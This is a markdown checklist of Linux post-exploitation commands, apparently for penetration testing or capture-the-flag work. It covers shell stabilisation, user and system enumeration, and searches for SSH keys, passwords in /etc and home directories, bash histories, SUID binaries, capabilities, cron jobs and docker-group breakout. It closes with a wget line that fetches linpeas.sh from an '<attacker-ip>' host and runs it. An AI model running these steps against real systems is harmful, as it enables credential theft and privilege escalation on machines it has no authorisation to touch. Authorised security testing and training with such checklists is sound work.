# enum_checklist_pe
---

## 🧩 0. Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

---

## 🧠 1. System Information

```bash
hostname
whoami
id
uname -a
cat /etc/os-release
uptime
cat /proc/version
```

---

## 👤 2. User Information

```bash
who
w
last -a | head -n 10
cat /etc/passwd
cat /etc/group
getent passwd
getent group
```

### Current User Context:

```bash
id
groups
sudo -l 2>/dev/null
```

---

## 📂 3. Home Directories / Sensitive Files

```bash
ls -la /root
ls -la /home
ls -la /home/*/.ssh
cat /home/*/.bash_history 2>/dev/null
```

---

## 🔐 4. Credentials / SSH Keys / Tokens

```bash
find / -name id_rsa 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home 2>/dev/null
```

---

## 💥 5. Privilege Escalation Vectors

### SUID / SGID Binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### World-Writable Files & Directories:

```bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
```

### Capabilities:

```bash
getcap -r / 2>/dev/null
```

### Cron Jobs:

```bash
crontab -l 2>/dev/null
ls -la /etc/cron*
cat /etc/crontab
```

### Check for Docker/LXC (container breakout):

```bash
which docker
docker ps -a
id | grep docker
```

---

## 🧠 6. Running Processes / Services

```bash
ps aux
systemctl list-units --type=service
service --status-all 2>/dev/null
```

---

## 📡 7. Network Information

```bash
ip a
ip r
ss -tulnp
cat /etc/resolv.conf
arp -a
netstat -tulnp
```

---

## 🧱 8. Installed Software / Package Manager

```bash
dpkg -l 2>/dev/null | grep -i security
rpm -qa 2>/dev/null
```

---

## 🔍 9. File Systems & Mounts

```bash
df -h
mount
lsblk
```

---

## 🔐 10. Useful Environment Variables

```bash
env
echo $PATH
```

---

## 🔭 11. Scheduled Jobs

```bash
cat /etc/crontab
ls -l /etc/cron.d/
ls -l /etc/cron.daily/
```

---

## 📁 12. Look for Backups / Databases / Logs

```bash
ls -la /var/backups
ls -la /var/log
find / -name "*.sql" 2>/dev/null
```

---

## 🧰 Optional Tools (Only if Safe)

```bash
wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

